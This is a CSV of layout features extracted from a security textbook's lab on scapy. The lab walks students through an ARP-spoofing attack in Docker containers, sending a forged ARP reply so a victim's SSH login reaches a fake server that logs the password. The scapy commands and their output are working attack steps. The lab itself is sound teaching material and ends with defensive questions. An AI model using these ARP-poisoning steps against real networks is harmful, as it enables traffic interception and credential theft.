text,bbox,page_number,avg_font_size,word_count,is_all_caps,char_density,ratio_of_verbs,ratio_capitalized,ends_with_colon,is_bold,normalized_vertical_gap,indentation_change,same_alignment,is_centered_A,font_size_diff,same_font,is_bold_A,is_italic_A,is_monospace_A,same_bold,same_italic,same_monospace,line_a_ends_punctuation,line_b_starts_lowercase,is_linea_in_rectangle,is_lineb_in_rectangle,both_in_table,neither_in_table,is_linea_hashed,is_lineb_hashed,both_hashed,neither_hashed,title_label
If you receive the error failed to create network scapytestnet: Error response from daemon: Pool overlaps with other one on this address space check to see if you have other containers running and stop them. You may also need to run docker network prune to remove the old networks Docker built.,"[0, 0, 100, 20]",67,10.5,51,0,0.122,0.21568627450980393,0.09803921568627451,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"In the second terminal run docker-compose run victim bash and then from the prompt we’ll SSH to server using the password ""password"":","[0, 0, 100, 20]",67,10.5,22,0,0.056,0.125,0.08333333333333333,1,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
victim,"[0, 0, 100, 20]",68,9.98,1,0,0.003,0.0,0.0,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"PS C:\Users\rxt1077\it230\labs\scapy> docker-compose run victim bash Creating scapyvictimrun ... done bash-5.0# ssh server Warning: Permanently added 'server,172.20.0.5' ECDSA to the list of known hosts. root@server's password: ① You are now logged into 'server' presumably from 'victim' via SSH for this assignment.","[0, 0, 100, 20]",68,11.0,41,0,0.138,0.09302325581395349,0.16666666666666666,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
Leave this connection open while you experiment with scapy from 'attacker'. bf9ebe42a108:~#,"[0, 0, 100, 20]",68,11.0,12,0,0.04,0.25,0.08333333333333333,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,1,0,0,0,1,
"① The password is ""password"". It will not be echoed to the screen as you type it.","[0, 0, 100, 20]",68,10.5,17,0,0.0325,0.23529411764705882,0.11764705882352941,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
If for some reason the password will not work and you are sure you are typing it in correctly you can run the following command docker compose exec server passwd note it’s passwd and not password . Type in the password twice and it will be reset to whatever you typed. What you type will not be echoed to the screen. You should now be able to ssh from victim to server with the password you typed in.,"[0, 0, 100, 20]",68,10.5,78,0,0.1615,0.22784810126582278,0.05128205128205128,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"In the third terminal we’ll start by executing recall that at this point it’s already running sshesame in the background a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server’s IP address. Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5. attacker","[0, 0, 100, 20]",68,10.53,64,0,0.153,0.17142857142857143,0.07142857142857142,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"PS C:\Users\rxt1077\it230\labs\scapy> docker-compose exec attacker bash root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0 root@5195de3d330c:/# ip addr 1: lo: <LOOPBACK,UP,LOWERUP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo validlft forever preferredlft forever 2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000 link/ipip 0.0.0.0 brd 0.0.0.0","[0, 0, 100, 20]",68,11.0,58,0,0.2065,0.09375,0.10638297872340426,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"3: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000 link/sit 0.0.0.0 brd 0.0.0.0 347: eth0@if348: <BROADCAST,MULTICAST,UP,LOWERUP> mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 ① validlft forever preferredlft forever inet 172.20.0.5/32 scope global eth0 ② validlft forever preferredlft forever","[0, 0, 100, 20]",51,11.0,56,0,0.1915,0.05970149253731343,0.08791208791208792,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
① This is the IP we started with,"[0, 0, 100, 20]",68,10.5,8,0,0.0125,0.25,0.25,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
② This is an additional IP that attacker believes it has,"[0, 0, 100, 20]",69,10.5,11,0,0.023,0.36363636363636365,0.18181818181818182,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"Now that the attacker system is configured, we’ll start up scapy interactively: attacker","[0, 0, 100, 20]",69,10.57,13,0,0.038,0.26666666666666666,0.07142857142857142,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,1,1,0,0,0,1,0,0,0,1,
root@5195de3d330c:/# scapy INFO: Can't import matplotlib. Won't be able to plot.,"[0, 0, 100, 20]",69,11.0,11,0,0.035,0.2857142857142857,0.21428571428571427,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
INFO: Can't import PyX. Won't be able to use psdump or pdfdump. INFO: No IPv6 support in kernel,"[0, 0, 100, 20]",69,11.0,18,0,0.039,0.15,0.35,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. Dot11 INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.,"[0, 0, 100, 20]",69,11.0,17,0,0.0795,0.15789473684210525,0.36,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
"WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled.","[0, 0, 100, 20]",69,11.0,13,0,0.047,0.23076923076923078,0.46153846153846156,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
aSPY//YASa apyyyyCY//////////YCa    | sY//////YSpcs scpCY//Pp   | Welcome to Scapy ayp ayyyyyyySCP//Pp      syY//C  | Version 2.4.5 AYAsAYYYYYYYY///Ps       cY//S  | pCCCCY//p     cSSps y//Y  | https://github.com/secdev/scapy SPPPP///a     pP///AC//Y  | A//A      cyP////C  | Have fun! p///Ac      sC///a  |,"[0, 0, 100, 20]",69,11.0,34,0,0.117,0.037037037037037035,0.42857142857142855,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"P////YCpc      A//A  | To craft a packet, you have to be a scccccp///pSP///p     p//Y  | packet, and learn how to swim in sY/////////y caa      S//P  | the wires and in the waves. cayCyayP//Ya       pY/Ya  |    -- Jean-Claude Van Damme sY/PsY////YCc     aC//Yp  | sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>>","[0, 0, 100, 20]",69,10.96,47,0,0.12,0.175,0.35714285714285715,0,0,-20.0,0.0,1,0,0.34999999999999964,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"You’ll notice that scapy’s prompt is >>>, just like python because it is python. Since we’re working in python, let’s make our lives easier by defining a few simple variables: attacker","[0, 0, 100, 20]",69,10.55,31,0,0.077,0.2631578947368421,0.058823529411764705,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
">>> serverip = ""172.20.0.5"" ① >>> victimip = ""172.20.0.6""","[0, 0, 100, 20]",69,11.0,9,0,0.0245,0.2,0.0,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
① IPv4 addresses are strings in scapy,"[0, 0, 100, 20]",69,10.5,7,0,0.0155,0.14285714285714285,0.14285714285714285,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"Now let’s see how scapy allows us to build packets. We’ll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:","[0, 0, 100, 20]",69,10.5,36,0,0.0735,0.225,0.13157894736842105,1,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
attacker,"[0, 0, 100, 20]",66,10.65,1,0,0.004,0.0,0.0,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
">>> ping = Ether/IPdst=serverip/ICMP/""Ryan Tolboom"" ① >>> ping.show ② Ethernet ### dst    = 02:42:ac:14:00:05 src    = 02:42:ac:14:00:07 type   = IPv4 IP ### version  = 4 ihl    = None tos    = 0x0 len    = None id    = 1 flags   = frag   = 0 ttl    = 64 proto   = icmp chksum  = None src    = 172.20.0.7 dst    = 172.20.0.5 \options  \ ICMP ### type   = echo-request code   = 0 chksum  = None id    = 0x0 seq    = 0x0 unused  = '' Raw ### load   = 'Ryan Tolboom' >>> result = srp1ping ③ Begin emission:","[0, 0, 100, 20]",70,11.0,92,0,0.18,0.20967741935483872,0.20987654320987653,1,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
Finished sending 1 packets.,"[0, 0, 100, 20]",70,11.0,4,0,0.012,0.5,0.25,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
"Received 2 packets, got 1 answers, remaining 0 packets >>> result.show Ethernet ### dst    = 02:42:ac:14:00:07 src    = 02:42:ac:14:00:05 type   = IPv4 IP ### version  = 4 ihl    = 5 tos    = 0x0 len    = 40 id    = 62086 flags   = frag   = 0 ttl    = 64","[0, 0, 100, 20]",70,11.0,47,0,0.09,0.2571428571428571,0.09090909090909091,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
proto   = icmp chksum  = 0x301a src    = 172.20.0.5 dst    = 172.20.0.7 \options  \ ICMP ### type   = echo-reply code   = 0 chksum  = 0xea7a id    = 0x0 seq    = 0x0 unused  = '' Raw ### load   = 'Ryan Tolboom',"[0, 0, 100, 20]",70,11.0,40,0,0.0735,0.28,0.125,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
>>> servermac = result00.src >>> servermac '02:42:ac:14:00:05',"[0, 0, 100, 20]",71,11.0,7,0,0.028,0.4,0.0,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"① Scapy uses the '/' operator to nest protocols. This is my name in an ICMP packet, in an IP packet, in an Ethernet frame. Be sure you use your own name!","[0, 0, 100, 20]",71,10.5,32,0,0.061,0.16129032258064516,0.1935483870967742,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,1,0,0,0,1,
② The show command prints out packets in detail ③ The srp1 function sends and receives one packet at Layer 2,"[0, 0, 100, 20]",71,10.5,21,0,0.044,0.09523809523809523,0.14285714285714285,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
Notice how we use this to capture the server’s MAC address and save it in the servermac variable.,"[0, 0, 100, 20]",71,10.5,18,0,0.04,0.2,0.10526315789473684,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.,"[0, 0, 100, 20]",71,10.5,23,0,0.055,0.13043478260869565,0.08333333333333333,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"We can also determine MAC addresses at Layer 2 with an ARP ""who-has"" request. Let’s craft and send a broadcast ethernet frame with an ARP ""who-has"" request for the victims’s IP address. The result will tell use what the victim’s MAC address is: attacker","[0, 0, 100, 20]",71,10.54,44,0,0.105,0.18,0.1836734693877551,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
">>> whohas = Etherdst=""ff:ff:ff:ff:ff:ff""/ARPpdst=victimip >>> result = srp1whohas Begin emission:","[0, 0, 100, 20]",71,11.0,10,0,0.0445,0.07692307692307693,0.21428571428571427,1,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
Finished sending 1 packets.,"[0, 0, 100, 20]",70,11.0,4,0,0.012,0.5,0.25,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
"Received 1 packets, got 1 answers, remaining 0 packets >>> result.show Ethernet ### dst    = 02:42:ac:14:00:07 src    = 02:42:ac:14:00:06 ① type   = ARP ARP ### hwtype  = 0x1 ptype   = IPv4","[0, 0, 100, 20]",71,11.0,31,0,0.074,0.24,0.14705882352941177,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
hwlen   = 6 plen   = 4 op    = is-at hwsrc   = 02:42:ac:14:00:06 psrc   = 172.20.0.6 hwdst   = 02:42:ac:14:00:07 pdst   = 172.20.0.7,"[0, 0, 100, 20]",72,11.0,21,0,0.0485,0.375,0.0,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
>>> victimmac = result0.src,"[0, 0, 100, 20]",72,11.0,4,0,0.012,0.0,0.0,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"① This is my MAC address of victim, but yours may be different!","[0, 0, 100, 20]",72,10.5,13,0,0.0255,0.15384615384615385,0.15384615384615385,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
This is how an ARP exchange is supposed to work. We broadcast out asking what MAC we should use for a certain IP and we get a response from the person who legitimately has that MAC and IP . We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP: attacker,"[0, 0, 100, 20]",72,10.53,66,0,0.134,0.24615384615384617,0.15384615384615385,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
">>> victimip, victimmac, serverip, servermac '172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05'","[0, 0, 100, 20]",72,11.0,9,0,0.0525,0.0,0.0,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
Now let’s make and view an evil ARP packet: attacker,"[0, 0, 100, 20]",72,10.57,10,0,0.0215,0.16666666666666666,0.18181818181818182,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,1,1,0,0,0,1,0,0,0,1,
">>> badarp = ARPop=2, pdst=victimip, psrc=serverip, hwdst=victimmac >>> badarp","[0, 0, 100, 20]",72,11.0,9,0,0.035,0.0,0.1,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
<ARP op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |>,"[0, 0, 100, 20]",72,11.0,6,0,0.0335,0.0,0.047619047619047616,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours by default, we don’t specify with hwsrc . This means the victim will update their ARP cache such that frames destined for server go to attacker. This effectively reroutes all layer 2 traffic that was going to the server from the victim. Go ahead an send that ARP packet: attacker","[0, 0, 100, 20]",72,10.53,83,0,0.1765,0.20238095238095238,0.10843373493975904,0,0,-20.0,0.0,1,0,0.15000000000000036,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
>>> sendbadarp Sent 1 packets.,"[0, 0, 100, 20]",72,11.0,5,0,0.013,0.25,0.25,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"Now go back to the victim terminal with the SSH connection to server and try typing something. As soon as SSH has to send data, you will get a broken pipe error and the connection will drop. Faced with such a problem, what do you think most users will do? Probably try to reconnect, let’s try that too. Remember the password is ""password"".","[0, 0, 100, 20]",72,10.5,63,0,0.1385,0.26153846153846155,0.109375,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
victim,"[0, 0, 100, 20]",68,9.98,1,0,0.003,0.0,0.0,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
You are now logged into 'server' presumably from 'victim' via SSH for this assignment.,"[0, 0, 100, 20]",68,11.0,14,0,0.0365,0.14285714285714285,0.14285714285714285,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"Leave this connection open while you experiment with scapy from 'attacker'. bf9ebe42a108:~# clientloop: send disconnect: Broken pipe ① bash-5.0# ssh server Warning: Permanently added 'server,172.20.0.5' ECDSA to the list of known hosts. root@server's password:","[0, 0, 100, 20]",68,11.0,34,0,0.1135,0.1388888888888889,0.11904761904761904,1,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,1,0,0,0,1,
① This happened when they tried to type something right after we sent the malicious ARP,"[0, 0, 100, 20]",73,10.5,16,0,0.036,0.25,0.125,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"Wait, that prompt looks a little different and where’s the message about staying logged in? It turns out the victim actually signed into our fake SSH server and their username and password were logged! Take a look at the output from the terminal running docker-compose up, you’ll see the credentials entered: docker-compose up terminal","[0, 0, 100, 20]",73,10.4,54,0,0.141,0.20689655172413793,0.06896551724137931,0,0,-20.0,0.0,1,0,0.5199999999999996,0,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
"attacker1 | 2021/10/07 01:21:41 172.20.0.6:60252 authentication for user ""root"" with password ""password"" accepted","[0, 0, 100, 20]",73,11.0,13,0,0.0505,0.16666666666666666,0.0,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
1. How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?,"[0, 0, 100, 20]",73,10.5,21,0,0.0435,0.19047619047619047,0.09523809523809523,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
2. Would using keys instead of passwords help prevent this kind of attack? Why or why not?,"[0, 0, 100, 20]",73,10.5,17,0,0.037,0.17647058823529413,0.11764705882352941,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
3. How would managing host keys correctly prevent this kind of attack?https://www.ssh.com/academy/ssh/host-key,"[0, 0, 100, 20]",73,10.5,12,0,0.0495,0.14285714285714285,0.05,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"To stop the running containers, you can type Ctrl-C in the terminal running docker-compose up, exit out of the victim, and exit out of the attacker.","[0, 0, 100, 20]",73,10.5,26,0,0.0615,0.15384615384615385,0.10714285714285714,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
5.8. Review Questions,"[0, 0, 100, 20]",73,18.0,3,0,0.0095,0.0,0.5,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
1. What can MAC address spoofing allow an attacker to do? What steps can be taken to mitigate this risk?,"[0, 0, 100, 20]",73,10.5,20,0,0.0425,0.35,0.15,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
2. What is the difference between horizontal and vertical privilege escalation? Give an example of each.,"[0, 0, 100, 20]",73,10.5,16,0,0.0445,0.125,0.125,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
3. What is XSS and how can it be used in an attack?,"[0, 0, 100, 20]",73,10.5,13,0,0.0195,0.23076923076923078,0.15384615384615385,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,1,0,0,0,0,1,0,0,0,1,
6. Security Solutions,"[0, 0, 100, 20]",74,22.0,3,0,0.0095,0.0,0.6666666666666666,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
"To help combat security breaches, many different vendors offer security solutions. These may be hardware or software designed to help mitigate a security threat. Security solutions may be created in-house, created custom by a third party, or outsourced and offered as a service. When evaluating solutions it is important to have a plan and understand the features and possible pitfalls of that product.","[0, 0, 100, 20]",74,10.5,63,0,0.17,0.25396825396825395,0.0625,0,0,-20.0,0.0,1,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,1,
6.1. False Positives / Negatives,"[0, 0, 100, 20]",74,18.0,5,0,0.014,0.0,0.6,0,0,0.0,0.0,1,1,0.0,1,0,0,0,1,1,1,0,0,0,0,0,1,0,0,0,1,
